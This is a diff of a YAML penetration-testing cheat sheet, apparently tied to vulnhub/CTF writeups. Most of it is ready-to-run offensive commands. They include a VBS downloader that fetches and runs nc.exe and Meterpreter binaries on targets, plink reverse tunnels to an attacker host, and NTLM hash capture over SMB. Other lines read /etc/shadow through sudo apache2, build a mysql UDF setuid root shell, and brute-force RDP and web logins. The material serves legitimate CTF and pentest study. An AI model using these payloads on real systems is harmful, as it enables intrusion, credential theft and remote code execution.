-      \    exploit\nclient:\n  download: tftp -i <targetip> GET met8888.exe\n  upload:\
-      \ tftp -i <targetip> PUT hashes.txt\n  install: pkgmgr /iu:\"TFTP\"\n"
+      \ -r disk:remotedisk=/usr/share/windows-binaries\n\ngzip+xxd:\n  sender:\n \
+      \   gzip -c < file > file.gz\n    xxd -p file.gz | tr -d '\\n' && echo\n  receiver:\n\
+      \    echo 1f8b...0000 > /tmp/file.gz.hex\n    xxd -p -r < /tmp/file.gz.hex >\
+      \ /tmp/file.gz\n    gunzip -c < /tmp/file.gz > /tmp/file\n\nautomate file download\
+      \ via windows ftp client:\n  echo open <targetip> >ftp_commands.txt\n  echo\
+      \ anonymous >>ftp_commands.txt\n  echo whatever >>ftp_commands.txt\n  echo binary\
+      \ >>ftp_commands.txt\n  echo get met8888.exe >>ftp_commands.txt\n  echo bye\
+      \ >>ftp_commands.txt\n  ftp -s:ftp_commands.txt\n\ncreate wget.vbs and download\
+      \ netcat:\n  >C:\\Windows\\d.vbs\n  echo strUrl = WScript.Arguments.Item(0)\
+      \  >>C:\\Windows\\d.vbs\n  echo StrFile = WScript.Arguments.Item(1)  >>C:\\\
+      Windows\\d.vbs\n  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\\Windows\\\
+      d.vbs\n  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\\Windows\\\
+      d.vbs\n  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\\Windows\\d.vbs\n\
+      \  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\\Windows\\d.vbs\n  echo\
+      \ Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  >>C:\\Windows\\\
+      d.vbs\n  echo Err.Clear  >>C:\\Windows\\d.vbs\n  echo Set http = Nothing  >>C:\\\
+      Windows\\d.vbs\n  echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\"\
+      )  >>C:\\Windows\\d.vbs\n  echo If http Is Nothing Then Set http = CreateObject(\"\
+      WinHttp.WinHttpRequest\")   >>C:\\Windows\\d.vbs\n  echo If http Is Nothing\
+      \ Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")   >>C:\\Windows\\d.vbs\n\
+      \  echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\"\
+      )  >>C:\\Windows\\d.vbs\n  echo http.Open \"GET\", strURL, False  >>C:\\Windows\\\
+      d.vbs\n  echo http.Send  >>C:\\Windows\\d.vbs\n  echo varByteArray = http.ResponseBody\
+      \  >>C:\\Windows\\d.vbs\n  echo Set http = Nothing  >>C:\\Windows\\d.vbs\n \
+      \ echo Set fs = CreateObject(\"Scripting.FileSystemObject\")  >>C:\\Windows\\\
+      d.vbs\n  echo Set ts = fs.CreateTextFile(StrFile, True)  >>C:\\Windows\\d.vbs\n\
+      \  echo strData = \"\"  >>C:\\Windows\\d.vbs\n  echo strBuffer = \"\"  >>C:\\\
+      Windows\\d.vbs\n  echo For lngCounter = 0 to UBound(varByteArray)  >>C:\\Windows\\\
+      d.vbs\n  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))\
+      \  >>C:\\Windows\\d.vbs\n  echo Next  >>C:\\Windows\\d.vbs\n  echo ts.Close\
+      \ >>C:\\Windows\\d.vbs\n  dir C:\\Windows\\d.vbs\n  C:\\Windows\\d.vbs \"http://<targetip>/nc.exe\"\
+      \ C:\\Windows\\nc.exe\n\nnetcat:\n  nc -w3 <targetip> 1234 <file.sent\n  cmd\
+      \ /c nc.exe -l -v -p 1234 >file.rcvd\n\nsmb (139/tcp, 445/tcp):\n  server: python\
+      \ smbserver.py -smb2support shared $HOME/toolbox/scripts/shared\n    copy ntlm/lm\
+      \ hashes submitted by windows clients during transfers and crack via jtr/hashcat\n\
+      \  client:\n    list files: smbclient -L <targetip> --no-pass\n    list files:\
+      \ net view \\\\<targetip>\n    list files: dir \\\\<targetip>\\shared\n    copy\
+      \ files: copy \\\\<targetip>\\shared\\met8888.exe\n    execute files: \\\\<targetip>\\\
+      shared\\met8888.exe\n\ntftp (69/udp):\n  server:\n    atftpd --daemon --port\
+      \ 69 $HOME/toolbox/scripts/shared\n    metasploit:\n      use auxiliary/server/tftp\n\
+      \      set TFTPROOT $HOME/toolbox/scripts/shared\n      exploit\n  client:\n\
+      \    download: tftp -i <targetip> GET met8888.exe\n    upload: tftp -i <targetip>\
+      \ PUT hashes.txt\n    install: pkgmgr /iu:\"TFTP\"\n"
     description: file transfers
   - cli: 'nmap --script=ssl-heartbleed -p <targetport> <targetip>
 
@@ -6880,6 +7072,10 @@ summary:
 
       socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
 
+
+      plink.exe -v -x -a -T -C -noagent -ssh -pw "<localpassword>" -R <targetport>:127.0.0.1:<targetport>
+      <localuser>@<attackerip>
+
       '
     description: port forward
   - cli: 'knock once on port 8080/tcp:
@@ -6932,29 +7128,30 @@ summary:
       \ if needed\n      su <username>\n    https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54\n\
       \      gcc -pthread c0w.c -o c0w\n      ./c0w\n      /usr/bin/passwd\n    vmsplice:\n\
       \    https://www.exploit-db.com/exploits/5092\n  service:\n    manual:\n   \
-      \ find services running as root:\n      $ ps aux | grep \"^root\"\n    find\
-      \ program version:\n      $ <program> --version\n      $ <program> -v\n    \
-      \  $ dpkg -l | grep <program>\n      $ rpm -qa | grep <program>\n    apache2:\n\
-      \    sudo -l => shows apache2 can be run as sudo\n    sudo apache2 -f /etc/shadow\
-      \ => will throw an error upon reading the first line of shadow file and dump\
-      \ hash on stdout, copy it to a file\n    john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst\
-      \ hash\n    exim:\n    dpkg -l | grep -i exim => version <4.86.2\n    exim -bV\
-      \ -v | grep -i perl => compiled with perl support\n    head /etc/exim.conf =>\
-      \ configuration has perl_startup option\n    ./cve_2016-1521.sh\n    lxd:\n\
-      \    check output of id command\n    if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html\n\
-      \    mysqld:\n    when mysql is running as root\n    mysql has ability to install\
-      \ uder defined functions which run via shared objects\n    use [edb:1518](https://www.exploit-db.com/exploits/1518)\n\
-      \    once exploit is complete, do the following:\n      mysql> select do_system('cp\
-      \ /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');\n      mysql> exit\n   \
-      \   $ /tmp/rootbash -p\n      rootbash-4.1# id\n        uid=1000(user) gid=1000(user)\
-      \ euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\
-      \    strace:\n    https://gtfobins.github.io/gtfobins/strace/\n    write a c\
-      \ program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/\n\
+      \   find services running as root:\n        $ ps aux | grep \"^root\"\n    \
+      \  find program version:\n        $ <program> --version\n        $ <program>\
+      \ -v\n        $ dpkg -l | grep <program>\n        $ rpm -qa | grep <program>\n\
+      \    apache2:\n      sudo -l => shows apache2 can be run as sudo\n      sudo\
+      \ apache2 -f /etc/shadow => will throw an error upon reading the first line\
+      \ of shadow file and dump hash on stdout, copy it to a file\n      john --format=crypt\
+      \ --wordlist=/usr/share/wordlists/nmap.lst hash\n    exim:\n      dpkg -l |\
+      \ grep -i exim => version <4.86.2\n      exim -bV -v | grep -i perl => compiled\
+      \ with perl support\n      head /etc/exim.conf => configuration has perl_startup\
+      \ option\n      ./cve_2016-1521.sh\n    lxd:\n      check output of id command\n\
+      \      if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html\n\
+      \    mysqld:\n      when mysql is running as root\n      mysql has ability to\
+      \ install uder defined functions which run via shared objects\n      use [edb:1518](https://www.exploit-db.com/exploits/1518)\n\
+      \      once exploit is complete, do the following:\n        mysql> select do_system('cp\
+      \ /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');\n        mysql> exit\n \
+      \       $ /tmp/rootbash -p\n        rootbash-4.1# id\n          uid=1000(user)\
+      \ gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\
+      \    strace:\n      https://gtfobins.github.io/gtfobins/strace/\n      write\
+      \ a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/\n\
       \    udev:\n    netlink:\n        https://www.exploit-db.com/exploits/8478\n\
       \        affected udev versions: <1.4.1\n        cat /proc/net/netlink\n   \
-      \     select pid for group \"ffffffff\"\n    port forwarding:\n    if the root\
-      \ process is bound to an internal port and for some reason we cannot run the\
-      \ exploit locally, use port forwarding via ssh:\n    $ ssh -R <local-port>:127.0.0.1:<target-port>\
+      \     select pid for group \"ffffffff\"\n    port forwarding:\n      if the\
+      \ root process is bound to an internal port and for some reason we cannot run\
+      \ the exploit locally, use port forwarding via ssh:\n      $ ssh -R <local-port>:127.0.0.1:<target-port>\
       \ <username>@<local-machine>\n  weak file permissions:\n    important commands:\n\
       \    $ find /etc -maxdepth 1 -writable -type f\n    $ find /etc -maxdepth 1\
       \ -readable -type f\n    $ find / -executable -writable -type d 2> /dev/null\n\
@@ -7440,11 +7637,8 @@ summary:
 
       '
     description: netcat
-  - cli: 'bruteforce rdp login:
-
-      ncrack -vv --user administrator -P passwords.txt rdp://<targetip>
-
-      '
+  - cli: "bruteforce rdp login:\n  ncrack -vv --user administrator -P passwords.txt\
+      \ rdp://<targetip>\n"
     description: ncrack
   - cli: 'netdiscover -r 192.168.92.0/24
 
@@ -7456,42 +7650,15 @@ summary:
 
       '
     description: nikto
-  - cli: 'vulners nse script:
-
-      https://github.com/vulnersCom/nmap-vulners
-
-      searchsploit-like vuln scan:
-
-      nmap --script vulners --script-args mincvss=5.0 <targetip>
-
-      ping sweep:
-
-      nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap | grep Up |
-      cut -d" " -f2
-
-      quick tcp:
-
-      nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap <targetip>
-
-      quick udp:
-
-      nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>
-
-      full/intensive tcp:
-
-      nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
-
-      full/intensive udp:
-
-      nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
-
-      smb bruteforce:
-
-      nmap --script=smb-brute.nse <targetip>
-
-      nmap -sV -p 445 --script smb-brute <targetiprange>
-
-      '
+  - cli: "vulners nse script:\n  https://github.com/vulnersCom/nmap-vulners\nsearchsploit-like\
+      \ vuln scan:\n  nmap --script vulners --script-args mincvss=5.0 <targetip>\n\
+      ping sweep:\n  nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap\
+      \ | grep Up | cut -d\" \" -f2\nquick tcp:\n  nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap\
+      \ <targetip>\nquick udp:\n  nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>\n\
+      full/intensive tcp:\n  nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>\n\
+      full/intensive udp:\n  nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>\n\
+      smb bruteforce:\n  nmap --script=smb-brute.nse <targetip>\n  nmap -sV -p 445\
+      \ --script smb-brute <targetiprange>\n"
     description: nmap
   - cli: 'openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out
       server.crt -subj "/CN=root.kali.pwn" --days 7 ## create a new x509 certificate
@@ -7580,19 +7747,19 @@ summary:
 
       '
     description: unicornscan
-  - cli: "enumerate directories:\nwfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
-      \ \"http://127.0.0.1/index.php?vuln=../FUZZ/file1.php\"\nwfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt\
-      \ --sc 200 -t 50 http://192.168.30.129:4480/FUZZ\nwfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt\
+  - cli: "enumerate directories:\n  wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+      \ \"http://127.0.0.1/index.php?vuln=../FUZZ/file1.php\"\n  wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt\
+      \ --sc 200 -t 50 http://192.168.30.129:4480/FUZZ\n  wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt\
       \ --sc 200 -t 50 http://192.168.30.129:4488/FUZZ\nenumerate directories and\
-      \ filter on response length:\nwfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
-      \ --hh 158607 http://bart.htb/FUZZ\nbruteforce password:\nbruteforce a single\
-      \ list:\n  wfuzz -w pwds.db -d \"user=pinkadmin&pass=FUZZ&pin=FUZ2Z\" -t 50\
-      \ --hw 6 http://192.168.30.129:4480/login.php\nbruteforce multiple lists:\n\
-      \  wfuzz -w pwds.db -w pins.txt -d \"user=pinkadmin&pass=FUZZ&pin=FUZ2Z\" -t\
-      \ 50 --hw 6 http://192.168.30.129:4480/login.php\nbruteforce multiple lists,\
-      \ but faster:\n  wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345'\
-      \ --hh 45 http://192.168.0.74:8080/login.php\n  wfuzz -c -z file,./pin.txt -d\
-      \ 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php\n"
+      \ filter on response length:\n  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+      \ --hh 158607 http://bart.htb/FUZZ\nbruteforce password:\n  bruteforce a single\
+      \ list:\n    wfuzz -w pwds.db -d \"user=pinkadmin&pass=FUZZ&pin=FUZ2Z\" -t 50\
+      \ --hw 6 http://192.168.30.129:4480/login.php\n  bruteforce multiple lists:\n\
+      \    wfuzz -w pwds.db -w pins.txt -d \"user=pinkadmin&pass=FUZZ&pin=FUZ2Z\"\
+      \ -t 50 --hw 6 http://192.168.30.129:4480/login.php\n  bruteforce multiple lists,\
+      \ but faster:\n    wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345'\
+      \ --hh 45 http://192.168.0.74:8080/login.php\n    wfuzz -c -z file,./pin.txt\
+      \ -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php\n"
     description: wfuzz
   ttpsitw:
     '10000':
@@ -8040,6 +8207,7 @@ summary:
       - http/Apache httpd 2.4.25 ((Debian))
       - http/Apache httpd 2.4.29 ((Ubuntu))
       - http/Apache httpd 2.4.34 ((Ubuntu))
+      - http/Apache httpd 2.4.41 ((Ubuntu))
       - http/Apache httpd 2.4.7 ((Ubuntu))
       - http/HttpFileServer httpd 2.3
       - http/Microsoft IIS httpd 6.0
@@ -8072,6 +8240,7 @@ summary:
       - exploit_python_reverseshell
       - exploit_shellshock
       - exploit_sqli
+      - exploit_ssh_privatekeys
       - exploit_wordpress_defaultcreds
       - exploit_wordpress_plugin
       - exploit_wordpress_plugin_activitymonitor
@@ -8084,6 +8253,7 @@ summary:
       - privesc_cron
       - privesc_cron_rootjobs
       - privesc_kernel_ipappend
+      - privesc_lxc_bash
       - privesc_mysql_creds
       - privesc_mysql_root
       - privesc_mysql_udf
@@ -8139,6 +8309,9 @@ summary:
       - name: 'IMF: 1'
         url: https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf
         verbose_id: vulnhub#162
+      - name: 'InfoSec Prep: OSCP'
+        url: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
+        verbose_id: vulnhub#508
       - name: 'Kioptrix: Level 1.1 (#2)'
         url: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf
         verbose_id: vulnhub#23
